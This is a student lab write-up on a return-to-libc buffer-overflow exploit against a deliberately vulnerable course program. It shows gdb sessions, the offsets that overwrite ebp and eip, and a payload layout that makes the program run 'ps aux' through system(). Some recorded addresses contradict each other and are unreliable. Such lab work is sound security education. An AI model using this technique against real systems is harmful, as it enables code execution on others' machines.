----------------------------------------

Part 2: Return to libc

Objective:
Construct an exploit input that takes advantage of the existing “system” library call in libc to achieve the same goal as in the first task.
That is, we want to run “ps” command, without injecting any code into the stack of the vulnerable program.
Instead of jumping to the shell code from the exploit input, we want to redirect the program to jump into the “system” function call.
We need to locate the entrypoint of the “system” function call and prepare the stack properly to supply the parameter “ps” to the system function call.

Steps:

(gdb) display &system
    &system = (<text variable, no debug info> *) 0xf7e3a940 <system>

trying to run with the original returntolibc.bin shell code fails

(gdb) run < return.bin
    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < return.bin
    Enter password:

    Program received signal SIGSEGV, Segmentation fault.
    0x61616161 in ?? ()

this causes a segfault but also reveals what parts of the shellcode end up where.

(gdb) info registers
    ...
    esp            0xffffd070	0xffffd0b0
    ebp            0x61616161	0x61616161
    ...
    eip            0x61616161	0x61616161
    ...

in the original returntolibc.bin shell code, there are 8 groups of "61 61 61 61" before the part for PS.

using the original shell code, it looks like some of the groups affect ebp and eip like in part 1

the 6th group of bytes changes ebp
the 7th group of bytes changes eip

&system       = 0xf7e3a940
&Password     = 0xffffd094
&Password[28] = 0xffffd0b0 "&system"
&Password[40] = 0xffffd09c "ps aux"

address of system goes at position 7 in the shell code

structure of shell code: offset + &system + dummy return address + &command

aaaaaaaaaaaaaaaaaaaaaaaa + 40 a9 e3 f7 + aaaa +  9c d0 ff ff + aaaa + ps aux

running modified shell code successfully:

Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < return.bin
Enter password:
[New process 14486]
process 14486 is executing new program: /bin/dash
[New process 14487]
process 14487 is executing new program: /bin/ps
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 185472  6028 ?        Ss   Jan16   0:01 /sbin/init splash
root         2  0.0  0.0      0     0 ?        S    Jan16   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   Jan16   0:00 [kworker/0:0H]
...
root     14413  0.0  0.0      0     0 ?        I    13:48   0:00 [kworker/u8:0]
duluoz   14460  1.2  0.3 605632 28124 ?        Rl   13:50   0:00 mate-terminal
duluoz   14467  0.0  0.0  14872  1740 ?        S    13:50   0:00 gnome-pty-helper
duluoz   14468  0.1  0.0  22672  5148 pts/1    Ss   13:50   0:00 bash
duluoz   14480  6.8  0.5 106924 44756 pts/1    S    13:50   0:00 gdb ./example01
duluoz   14482  0.0  0.0   2192   568 pts/1    S+   13:50   0:00 /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01
duluoz   14486  0.0  0.0   4504   920 pts/1    S+   13:50   0:00 sh -c ps aux
duluoz   14487  0.0  0.0  37364  3284 pts/1    R+   13:50   0:00 ps aux
[Inferior 3 (process 14487) exited normally]
